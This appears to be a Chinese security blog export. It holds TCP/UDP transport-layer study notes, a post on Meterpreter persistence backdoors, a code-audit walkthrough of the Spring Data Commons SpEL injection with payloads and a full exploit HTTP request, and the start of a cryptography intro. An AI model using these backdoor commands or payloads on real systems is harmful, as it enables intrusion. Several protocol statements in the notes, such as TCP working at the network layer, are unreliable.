<p>把12字节伪首部(检验临时添加的)和UDP用户数据报加上一起进行检验。</p>
<p>如果接收方UDP发现收到的报文中目的端口号不正确，就丢弃该端口并使用ICMP发送“端口不可达”差错报文给发送方。traceroute就使用UDP用户数据报故意使用非法UDP端口，让目的主机返回“端口不可达”差错报文。</p>
<h2 id="传输控制协议-TCP"><a href="#传输控制协议-TCP" class="headerlink" title="传输控制协议(TCP)"></a>传输控制协议(TCP)</h2><p>面向连接的传输协议，每条连接有两个端口，都是点对点提供面向字节流(一次一个数据块)的可交付可靠的全双工通信。</p>
<p><strong>TCP连接</strong></p>
<p>TCP连接端点为套接字(端口号拼接IP地址)</p>
<p>Socket &#x3D; (IP地址：端口号)</p>
<p>TCP连接：：&#x3D;{Socket1,Socket2}</p>
<p>​                      &#x3D;{(IP1:Port1),(IP2:Port2)}</p>
<h3 id="可靠传输"><a href="#可靠传输" class="headerlink" title="可靠传输"></a>可靠传输</h3><p>理想传输条件：</p>
<ul>
<li>传输信道不产生差错。(差错重传)</li>
<li>不管发送方一多快的速度发送数据，接收方能都及时处理收到的数据。(拥塞控制)</li>
</ul>
<h4 id="停止等待协议"><a href="#停止等待协议" class="headerlink" title="停止等待协议"></a>停止等待协议</h4><p>在不可靠的传输网络中实现可靠传输。</p>
<ul>
<li>无差错情况。发送方发送分组目的主机，目的主机向发送方发送确认。</li>
<li>出现差错。接收方发现分组出错或者传输出错不通知发送方，当发送方超时计时器到期后就重新发送分组。</li>
<li>确认丢失和确认迟到。当发送方在超时计时器到期范围内未收到确认分组，重新发送分组。接收方对该分组丢弃并返回确认分组。</li>
</ul>
<p>在发送完一个分组后，必须暂时保留其副本分组，超时时器重传时间应当比数据在分组传输的平均往返时间更长。</p>
<p>ARQ(自动重传请求)：当发送方未在重传时间内收到接收方确认返回包，则自动发送重传分组，实现自动进行。</p>
<p>流水线传输：发送方连续发送多个分组，不必每发完一个分组就停顿下来等待对方的确认。</p>
<h4 id="连续ARQ协议"><a href="#连续ARQ协议" class="headerlink" title="连续ARQ协议"></a>连续ARQ协议</h4><p>使用流水线传输所用窗口。发送方每收到一个确认，就使发送窗口向前滑动一个分组位置。</p>
<p>累计确认：不必对收到分组逐个发送请求，对按序到达的最后一个分组发送确认。</p>
<p>优点：容易实现 </p>
<p>缺点：不能向发送方反映出接收方已经正确收到的所有分组信息。</p>
<p>Go-back-N(回退N)：发送方对接收方未发的确认分组退回重传n个分组。</p>
<h3 id="TCP报文段"><a href="#TCP报文段" class="headerlink" title="TCP报文段"></a><strong>TCP报文段</strong></h3><p>首部固定长度为20个字节，其他可选字节。</p>
<img src="/2022/07/20/%E4%BC%A0%E8%BE%93%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220729104058423.png" class title="image-20220729104058423">

<p>字段</p>
<img src="/2022/07/20/%E4%BC%A0%E8%BE%93%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220729104149864.png" class title="image-20220729104149864">

<h3 id="可靠传输的实现"><a href="#可靠传输的实现" class="headerlink" title="可靠传输的实现"></a><strong>可靠传输的实现</strong></h3><p>滑动窗口：发送窗口的发送缓存用来存放发送方准备发出和已发出但尚未收到确认的数据；接收方用来暂时存放按序到达但尚未被接受方读取和未按序到达的数据的程序。发送窗口是发送缓存的一部分。</p>
<p>发送窗口状态用三个指针描述：P1(窗口后沿)、P2(已发送但未收到确认)、P3(窗口前沿)</p>
<p>p3-p1:发送窗口</p>
<p>p2-p1:已发送未收到确认</p>
<p>p3-p2:允许发送但未发送(可用窗口)</p>
<p>注意：1、虽然A的发送窗口根据B的接收窗口设置，但网络传送窗口值需要经历时间，并不总是和接收窗口一样大。</p>
<p>​            2、对不按序到达的报文，将其临时缓存在接收窗口中，当缺少字节流到达后按序交付上层应用进程。</p>
<p>​            3、接收方累计确认功能不应过分推迟和捎带确认并不经常发生。</p>
<h4 id="超时重传时间选择"><a href="#超时重传时间选择" class="headerlink" title="超时重传时间选择"></a>超时重传时间选择</h4><p>采用自适应算法记录发送时间和确认时间。加权平均往返时间</p>
<p>RTTs&#x3D;(1-a) * 旧的RTTs样本 +a  * 新的RRT样本    a推荐值为1&#x2F;8</p>
<p>RFC2998建议：</p>
<p>RTO &#x3D; RTTs + 4 x RTTd</p>
<p>RTTd &#x3D; (1-B) *  旧的RTTd值 + B * |RTTs-新的RTT样本|，第一次测量为RRT样本值一半,B推荐值为1&#x2F;4.</p>
<p><strong>Karn算法</strong></p>
<p>设想问题：发送端发出一个报文段，当设定的超时时间到了还没收到确认，于是重传该报文段，经过一段时间后，发送端收到了报文确认。但无法判断该确认报文是对第一个报文的确认还是第二个报文的确认。</p>
<p>方法：报文段每重传一次，就把超时重传时间RTO增大一点。典型方法是将RTO时间翻倍。</p>
<p><strong>选择确认</strong></p>
<p>接收方在收到了和前面的字节流不连续的两个字节块，将这些字节缓存在接收窗口中并反馈给发送方不要重复发送。  但SACK文档未指名发送方如何响应SACK，大多数实现都是重传未确认的数据块。</p>
<h4 id="TCP流量控制"><a href="#TCP流量控制" class="headerlink" title="TCP流量控制"></a><strong>TCP流量控制</strong></h4><p>让发送方发送速率不要太快要让接收方来得及接收。</p>
<p><strong>滑动窗口机制</strong></p>
<p>在建立连接后，接收方告诉发送方发送窗口不能超过接收窗口数值。单位为字节，不是报文段。</p>
<p>防止发送方一直等待接收方的非零窗口造成的死锁局面，为每一个TCP连接设置持续计时器。当连接一方收到对方的零窗口通知后就启动持续计时器，计时器到期后发送零窗口探测报文段。 </p>
<h4 id="TCP拥塞控制"><a href="#TCP拥塞控制" class="headerlink" title="TCP拥塞控制"></a>TCP拥塞控制</h4><p>对资源需求的总和大于可用资源时，造成拥塞。</p>
<p>拥塞控制是使网络能够承受现有的负荷，流量控制是在指定的发送端和接收端之间的点对点通信量的控制。   </p>
<p>控制理论角度看拥塞控制，分为开环控制和闭环控制。</p>
<p>方法：</p>
<p>1、慢开始和拥塞避免</p>
<p>2、快传送和快恢复</p>
<p>慢开始：在主机刚刚开始发送报文段时将拥塞窗口cwnd设置为一个字节，设置一个慢开始阈值(ssthresh)。在每收到一个对新报文段的确认后，将拥塞窗口增加一个字节，这样来逐步增大发送端的拥塞窗口cwnd。</p>
<p>拥塞避免：当拥塞窗口大于慢开始阈值时，使拥塞窗口缓慢增长，每经过一个RTT后拥塞窗口增加一个字节(线性规律增加)</p>
<p>注：当网络出现拥塞时，将慢开始阈值设置为出现拥塞时的窗口大小一半，然后又将拥塞窗口设置为1执行慢开始算法。</p>
<img src="/2022/07/20/%E4%BC%A0%E8%BE%93%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220731120643778.png" class title="image-20220731120643778">

<p>快重传算法： 当接收方收到一个失序后的报文段后，立即向发送方发出重复确认。</p>
<p>快恢复算法：当发送方收到三个重复确认时，执行“乘法减小”算法，将慢开始门限设置为当前拥塞窗口一半，接着将拥塞窗口设置为慢开始门限，执行拥塞避免算法。</p>
<img src="/2022/07/20/%E4%BC%A0%E8%BE%93%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220731131640027.png" class title="image-20220731131640027">

<p>发送方窗口上限值为接收窗口rwnd和拥塞窗口cwnd的较小值。</p>
<p>乘法减小：无论在慢开始还是拥塞避免，只要出现超时(可能网络拥塞)，就把慢开始门限减半设置为当前拥塞窗口一半。</p>
<p>加法增大：执行拥塞避免算法后，使拥塞窗口缓慢增大，防止网络过早出现拥塞。 </p>
<h4 id="TCP运输连接管理"><a href="#TCP运输连接管理" class="headerlink" title="TCP运输连接管理"></a>TCP运输连接管理</h4><p><strong>连接管理</strong>(三次握手、四次挥手)</p>
<p>分为连接建立、数据传送、连接释放这三个部分。</p>
<img src="/2022/07/20/%E4%BC%A0%E8%BE%93%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220729153421938.png" class title="image-20220729153421938">

<p>三报文握手：</p>
<p>第一次握手：客户端给服务器发送SYN报文。首部的同步位SYN&#x3D;1，初始序号seq&#x3D;x.不携带数据，消耗一个序号。</p>
<p>第二次握手：服务端接收到客户端的SYN报文后，以自己的SYN报文应答。SYN报文中ack确定值为客户端的序列号x+1，SYN&#x3D;1，ACK&#x3D;1，序号seq&#x3D;y。</p>
<p>第三次握手：客户端在收到服务端的确认报文后，发送SYN报文。ACK值为服务端序列号y+1，序号为x+1，ACK&#x3D;1.(不消耗序号)</p>
<p>(第三次是防止已失效的连接请求报文突然又传送到服务器，没有第三次握手的话服务器就会认为连接建立等待客户机发送报文造成网络资源浪费。此时发送方发送复位报文段，拒绝连接)</p>
<img src="/2022/07/20/%E4%BC%A0%E8%BE%93%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220729160453532.png" class title="image-20220729160453532">

<p>四次挥手：</p>
<p>第一次挥手：客户端向服务端发送FIN报文，其中标识FIN&#x3D;1，序号为u。</p>
<p>第二次挥手：服务端在接收到客户端发送断开请求后，发送确认报文，其中ACK&#x3D;1,ack&#x3D;u+1,squ&#x3D;v。</p>
<p>第三次挥手：当服务端数据传输完毕后向客户端发送断开请求，其中报文中标识符FIN&#x3D;1，ACK&#x3D;1，seq&#x3D;w，ack&#x3D;u+1。</p>
<p>进入时间等待计时器(2min)，保证最后确认报文到达服务器。防止已失效的连接请求报文段。</p>
<p>第四次挥手：客户端接收到服务端的断开请求后，做出应答。报文中标识符ACK&#x3D;1,sqe&#x3D;u+1,ack&#x3D;w+1。</p>
<p>服务器结束TCP连接时间比客户端结束TCP连接要早一些。</p>
<h2 id="重点题型"><a href="#重点题型" class="headerlink" title="重点题型"></a>重点题型</h2><p>1、ISO传输层中数据传输的任务是在两个传输实体之间传输用户数据和控制数据。</p>
<p>2、在TCP&#x2F;ip协议簇中，UDP协议工作在传输层，TCP工作在网络层。</p>
<p>3、TCP&#x2F;IP协议帧类型</p>
<p>广播、多播、单播。</p>
<p>广播：Broadcast帧通过目标地址FFFFFFFFFFFFF发送到网上的所有主机，网络上所有主机能响应该数据帧。</p>
<p>多播：Multicast帧交付给网络上的一组主机。</p>
<p>单播：Unicast帧交付给网络上一个具体的硬件地址。其他所有主机丢弃这个帧。</p>
<p>4、SYN Flood攻击</p>
<p>发送大量伪造的TCP连接请求，从而使得被攻击方资源耗尽(CPU满负荷或内存不足)攻击方式。</p>
<p>主要原因是由于T CP第三次握手没完成，此时服务器端会在30s-2min时间段后进行重发第二次握手(SYN+ACK)报文，当有大量客户端发起该攻击时，服务器为了维持半连接而消耗非常多的资源，使得服务器无法处理正常请求。</p>
<p> 5、端口的作用是对TCP&#x2F;IP体系的应用进程进行统一的标识，使运行不同的操作系统的计算机的应用进程能够互相通信。</p>
<p>端口划分为3类原因：</p>
<p>避免端口号重复，无法区分应用进程。</p>
<p>6、<img src="/2022/07/20/%E4%BC%A0%E8%BE%93%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220730155423013.png" class title="image-20220730155423013"></p>
<p>不行。重传时，IP数据报的标识字段会有另外一个标识符。仅当标识符相同的IP数据报片才能组装成一个IP数据报、由于前两个IP数据报片的标识符与后两个IP数据报片的标识符不同，不能组装成一个IP数据报。</p>
<p>7、</p>
<p>运输层处于面向通信部分的最高层，用户功能中的最底层，为上面的应用层服务提供服务。</p>
<p>运输层为应用进程之间提供端到端的逻辑通信，网络层是为主机之间提供逻辑通信，必须由运输层以复用和分用的形式加载到网络层。</p>
<p>8、运输层复用</p>
<img src="/2022/07/20/%E4%BC%A0%E8%BE%93%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220730162445133.png" class title="image-20220730162445133">

<p>9、采用UDP方式</p>
<p>VOIP：由于语音信息具有一定的冗余度，有差错的UDP在接收端被直接抛弃，TCP数据报出错则会引起重传带来具大的变动。</p>
<p>10、接收方收到有差错的UDP用户数据报会丢弃或附加差错警告报告传给上层。</p>
<p>11、</p>
<p>UDP面向报文：发送方UDP对应用程序交下来的报文，在添加首部后就向下交付IP层 。UDP应用层交下来的报文，既不合并也不拆分，保留报文边界。接收方UDP对IP层交上来的UDP用户数据报在去除首部后交给上层的应用进程，一次交付一个完整的报文。</p>
<p>TCP对应用程序交下来的报文数据块保留在发送缓存中，将应用程序交下来的数据看成一连串的无结构的字节流，并不知道其字节流含义。</p>
<p>12、</p>
<p>证明：若使用n比特对分组进行编号，编号范围为2的n次方-1，一次可发送0-2的n次方个分组。若这些分组全部被正确接收，接收方进行ack确认，但此时发送方不知道此时的确认信息是以前的分组还是新的分组，因此发送窗口不超过2的n次方-1。</p>
<p>13、</p>
<p>在连续ARQ协议中，对那些发送端发送分组后的计时器采用链表记录法。信息域为分组的相对发送时间及分组的编号来实现。当编号为0的分组定时时钟到期后修改链表指针并重发次分组，收到确认后将指针指向编号为1的分组。</p>
<img src="/2022/07/20/%E4%BC%A0%E8%BE%93%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220730200001929.png" class title="image-20220730200001929">

<p>14、TCP首部除固定长度部分外，还有可选项，TCP首部长度是可变的，固定长度是20字节。UDP首部长度是固定8字节的。</p>
<p>15、IP数据报最大长度为2的16次方-1(65535字节)，IP数据报首部为20字节，TCP报文段首部为20字节，TCP报文段数据部分为65495字节，TCP报文段最大载荷是65515字节。</p>
<p>数据的字节长度超过TCP报文段的序号可能编出的最大序号，通过循坏使用序号仍能用TCP来传送。</p>
<p>16、最大吞吐量&#x2F;数据率&#x3D;最大窗口(字节)*8&#x2F;平均往返时间</p>
<p>17、慢开始、拥塞避免、快重传和快恢复算法。</p>
<p>慢开始：在主机刚刚开始发送报文段时将拥塞窗口cwnd设置为一个字节，设置一个慢开始阈值(ssthresh)。在每收到一个对新报文段的确认后，将拥塞窗口增加一个字节，这样来逐步增大发送端的拥塞窗口cwnd。</p>
<p>拥塞避免：当拥塞窗口大于慢开始阈值时，使拥塞窗口缓慢增长，每经过一个RTT后增加一个拥塞窗口(线性规律增加)</p>
<p>注：当网络出现拥塞时，将慢开始阈值设置为出现拥塞时的窗口大小一半，然后又将拥塞窗口设置为1执行慢开始算法。</p>
<img src="/2022/07/20/%E4%BC%A0%E8%BE%93%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220731120643778.png" class title="image-20220731120643778">

<p>快重传算法： 当发送方在收到接收方发送来的对上一个报文的3个确认报文，不必等待重传计时器的超时立即发送下一序号的报文。</p>
<p>快恢复算法：当发送方收到三个重复确认时，执行“乘法减小”算法，将当前拥塞窗口减半并将其设置为慢开始阈值，执行拥塞避免算法。</p>
<img src="/2022/07/20/%E4%BC%A0%E8%BE%93%E5%B1%82%E7%9F%A5%E8%AF%86%E8%A6%81%E7%82%B9/image-20220731131640027.png" class title="image-20220731131640027">

<p>18、除了由于网络拥塞导致的丢包，举例说明。</p>
<p>(1)、IP数据报在传输过程中需要分片，若其中某个分片未能及时到达终点而终点组装数据报已超时；</p>
<p>(2)、IP数据报已经到达终点，但终点的缓存没有足够的空间存放该数据报。</p>
<p>(3)、数据报在转发过程中经过网桥等中间设备，由于转发以及设备原因导致丢弃。</p>
<p>19、Karn算法允许TCP区分有效和无效的往返时间样本，从而改进往返时间的估算。若不采用Karn算法，而是在收到确认报文时都认为是对重传报文段的确认，得到的往返时间样本的重传时间都会偏小。最后减小很接近0.</p>
]]></content>
      <categories>
        <category>计网</category>
        <category>TCP/IP</category>
      </categories>
      <tags>
        <tag>-计算机网络 -传输层</tag>
      </tags>
  </entry>
  <entry>
    <title>后门永久植入</title>
    <url>/2022/05/15/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/</url>
    <content><![CDATA[<h1 id="后门永久植入"><a href="#后门永久植入" class="headerlink" title="后门永久植入"></a>后门永久植入</h1><hr>
<h2 id="meterpreter后门"><a href="#meterpreter后门" class="headerlink" title="meterpreter后门"></a>meterpreter后门</h2><h3 id="Metsvc"><a href="#Metsvc" class="headerlink" title="Metsvc"></a>Metsvc</h3><hr>
<p>该模块生成一个端口为31337服务，并且上传到Temp临时文件夹下保存，当系统启动时直接开启服务。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run metsvc -A</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/image-20211028164717074.png" class title="image-20211028164717074">



<h3 id="Persistence"><a href="#Persistence" class="headerlink" title="Persistence"></a>Persistence</h3><hr>
<p>该后门 模块 是通过设置定期时间连接服务器端口，系统启动时回连，自动运行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run persistence -A -S -U -i 60 -p 服务器端口 -r 服务器ip地址</span><br></pre></td></tr></table></figure>

<img src="/2022/05/15/%E5%90%8E%E9%97%A8%E6%B0%B8%E4%B9%85%E6%A4%8D%E5%85%A5/image-20211028165356667.png" class title="image-20211028165356667">



<p>可以看到生成个自动运行的木马到临时文件夹中，随着系统开启而运行</p>
]]></content>
      <categories>
        <category>内网渗透</category>
        <category>后门植入</category>
      </categories>
      <tags>
        <tag>-内网渗透 -后门植入 -msf后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>代码审计之Spring-Data-Commons-RCE</title>
    <url>/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Commons-RCE/</url>
    <content><![CDATA[<h1 id="代码审计之Spring-Data-Commons-RCE"><a href="#代码审计之Spring-Data-Commons-RCE" class="headerlink" title="代码审计之Spring-Data-Commons-RCE"></a>代码审计之Spring-Data-Commons-RCE</h1><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Spring Data是一个用于简化数据库访问，并支持云服务的开源框架,包含Commons、Gemfire、JPA、JDBC、MongoDB等模块。此漏洞产生于Spring Data Commons组件，该组件为提供共享的基础框架，适合各个子项目使用，支持跨数据库持久化。</p>
<p>该漏洞的成因是当用户在项目中利用了Sprng-Data的相关Web特性对输入参数进行自动匹配时会将用户提交的form表单和key值作为SpEL的执行内容，导致SpEL表达式注入漏洞。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>通过Git命令获取源码 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/spring-projects/spring-data-examples/</span><br></pre></td></tr></table></figure>

<p>这里由于在2.0.5版本中拒绝使用了SpEl表达式，所以需要回退到一个较早且存在漏洞的版本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reset --hard ec94079b8f2b1e66414f410d89003bd333fb6e7d</span><br></pre></td></tr></table></figure>

<img src="/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Commons-RCE/image-20220406115416611.png" class title="image-20220406115416611">

<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>Spring MVC框架会处理来自前端的页面的请求，并根据请求进行数据的封装，处理前端页面的请求暂不赘述，我们现在主要探讨对数据的封装处理，因为Spring Data Commons框架在做数据封装处理的时候产生了漏洞。</p>
<p>由提交对比Commit信息，考研发现漏洞文件应为MapDataBinder.java中的setPropertyVlue方法，如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public void setPropertyValue(String propertyName, @Nullable Object value) throws BeansException &#123;</span><br><span class="line">            if (!this.isWritableProperty(propertyName)) &#123;</span><br><span class="line">                throw new NotWritablePropertyException(this.type, propertyName);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                StandardEvaluationContext context = new StandardEvaluationContext();</span><br><span class="line">                context.addPropertyAccessor(new MapDataBinder.MapPropertyAccessor.PropertyTraversingMapAccessor(this.type, this.conversionService));</span><br><span class="line">                context.setTypeConverter(new StandardTypeConverter(this.conversionService));</span><br><span class="line">                context.setRootObject(this.map);</span><br><span class="line">                Expression expression = PARSER.parseExpression(propertyName);</span><br><span class="line">                PropertyPath leafProperty = this.getPropertyPath(propertyName).getLeafProperty();</span><br><span class="line">                TypeInformation&lt;?&gt; owningType = leafProperty.getOwningType();</span><br><span class="line">                TypeInformation&lt;?&gt; propertyType = leafProperty.getTypeInformation();</span><br><span class="line">                propertyType = propertyName.endsWith(&quot;]&quot;) ? propertyType.getActualType() : propertyType;</span><br><span class="line">                if (propertyType != null &amp;&amp; this.conversionRequired(value, propertyType.getType())) &#123;</span><br><span class="line">                    PropertyDescriptor descriptor = BeanUtils.getPropertyDescriptor(owningType.getType(), leafProperty.getSegment());</span><br><span class="line">                    if (descriptor == null) &#123;</span><br><span class="line">                        throw new IllegalStateException(String.format(&quot;Couldn&#x27;t find PropertyDescriptor for %s on %s!&quot;, leafProperty.getSegment(), owningType.getType()));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    MethodParameter methodParameter = new MethodParameter(descriptor.getReadMethod(), -1);</span><br><span class="line">                    TypeDescriptor typeDescriptor = TypeDescriptor.nested(methodParameter, 0);</span><br><span class="line">                    if (typeDescriptor == null) &#123;</span><br><span class="line">                        throw new IllegalStateException(String.format(&quot;Couldn&#x27;t obtain type descriptor for method parameter %s!&quot;, methodParameter));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    value = this.conversionService.convert(value, TypeDescriptor.forObject(value), typeDescriptor);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                expression.setValue(context, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<p>该方法首先通过isWritableProperty()函数校验propertyName参数 是否为Controller设置的Form映射对象中的成员变量。</p>
<img src="/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Commons-RCE/image-20220406135207008.png" class title="image-20220406135207008">

<img src="/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Commons-RCE/image-20220406135232464.png" class title="image-20220406135232464">

<p>然后再实例化StandardEvaluationContext类</p>
<img src="/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Commons-RCE/image-20220406135348825.png" class title="image-20220406135348825">

<p>并通过调用PARSER.parseExpression()来设置需要解析的表达式</p>
<img src="/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Commons-RCE/image-20220406135532192.png" class title="image-20220406135532192">

<p>最后通过调用expression.setValue()对SpEL表达式进行解析</p>
<img src="/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Commons-RCE/image-20220406135804188.png" class title="image-20220406135804188">



<p>从上面我们可以知道想要执行任意SpEL表达式的话，首先就要知道isWritableProperty()方法是如何对参数进行校验的并且绕过器校验即可。</p>
<p>继续跟进isWritableProperty()，可以看到关键代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public boolean isWritableProperty(String propertyName) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                return this.getPropertyPath(propertyName) != null;</span><br><span class="line">            &#125; catch (PropertyReferenceException var3) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>当getPropertyPath()返回值不为NULL时，直接对其执行return操作。跟进getPropertyPath()查看其逻辑，关键代码如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">private PropertyPath getPropertyPath(String propertyName) &#123;</span><br><span class="line">            String plainPropertyPath = propertyName.replaceAll(&quot;\\[.*?\\]&quot;, &quot;&quot;);</span><br><span class="line">            //正则匹配</span><br><span class="line">            return PropertyPath.from(plainPropertyPath, this.type);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>首先将正则匹配的字符.?*\进行 替换为空 ，并判断剩下的内容是否为type的属性。这里的type则是在Controller处用到的用于接收参数的类。</p>
<p>所以只需要利用这个类的某个字段来构造恶意的SpEL表达式，但直接使用如下payload是没有用的:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(&#x27;calc.exe&#x27;)</span><br></pre></td></tr></table></figure>

<p>由于在某些版本中添加了用来拒绝SpEL表达式的关键语句，所以需要使用反射来构造payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#this.getClass().forName(&quot;java.lang.Runtime&quot;).getRuntime().exec(&#x27;calc.exe&#x27;)</span><br></pre></td></tr></table></figure>



<p>成功构造pyload后便可寻找漏洞触发点，并对其进行测试，经过搜索可发现ProxyingHandlerMethodArgumentResolver.java中实例化了MapDataBinder对象，并调用了bind方法，将request.getParameterMap()作为参数，从前端获取传递过来的key-value的map类型的值</p>
<img src="/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Commons-RCE/image-20220406142447929.png" class title="image-20220406142447929">



<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>运行spring boot项目</p>
<img src="/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Commons-RCE/image-20220406145730359.png" class title="image-20220406145730359">



<p>浏览器访问locahost:8080&#x2F;users&#x2F;</p>
<img src="/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Commons-RCE/image-20220406145855003.png" class title="image-20220406145855003">



<p>输入payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username%5B%23this.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22calc.exe%22%29%5D=xxxxxxx</span><br></pre></td></tr></table></figure>



<p>构造数据请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /users HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8080</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: UM_distinctid=17d0947f1c862-0bbd9d1b4f56ea8-4c3e217e-1fa400-17d0947f1c9407; CNZZDATA1278069914=104780330-1636529643-%7C1636540572; __51uvsct__JGjrOr2rebvP6q2a=4; __51vcke__JGjrOr2rebvP6q2a=4c5322fc-092c-5527-b2a8-79802e8249c4; __51vuft__JGjrOr2rebvP6q2a=1636538257018</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 123</span><br><span class="line"></span><br><span class="line">username%5B%23this.getClass%28%29.forName%28%22java.lang.Runtime%22%29.getRuntime%28%29.exec%28%22calc.exe%22%29%5D=xxxxxxx</span><br></pre></td></tr></table></figure>



<p>命令执行成功</p>
<img src="/2022/04/06/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8BSpring-Data-Commons-RCE/image-20220406151302281.png" class title="image-20220406151302281">

<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://4ra1n.love/post/NeNCohaqp/">CVE-2018-1273分析 | 4ra1n</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/45501896">从CVE-2018-1273学漏洞分析 - 知乎 (zhihu.com)</a></p>
<p><a href="https://cloud.tencent.com/developer/news/321462">从CVE-2018-1273学漏洞分析 - 云+社区 - 腾讯云 (tencent.com)</a></p>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>java</category>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>-代码审计 -Spring -命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学简介</title>
    <url>/2023/03/17/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<h1 id="密码学简介"><a href="#密码学简介" class="headerlink" title="密码学简介"></a>密码学简介</h1><p>密码学一开始的功能是在有恶意攻击者存在的环境下，保护双方通信安全，现在是保护信息安全的核心技术。</p>
<p>现代信息安全的基本要求</p>
<ul>
<li>信息保密性(加解密)</li>
<li>信息完整性(消息认证码、数字签名)</li>
<li>认证性(消息认证码、数字签名)</li>
<li>不可否认性(数字签名)</li>
</ul>
<h2 id="古典密码学"><a href="#古典密码学" class="headerlink" title="古典密码学"></a>古典密码学</h2><p>经典算法：</p>
<ul>
<li>置换密码：加密过程中明文的字母保持相同，但是顺序被打乱。</li>
<li>代换密码：明文中的每一个字符被替换成密文中的另一个字符。</li>
</ul>
<h2 id="现代密码学"><a href="#现代密码学" class="headerlink" title="现代密码学"></a>现代密码学</h2><p>现代密码学主要有三个方向：对称密码、公钥密码和安全协议</p>
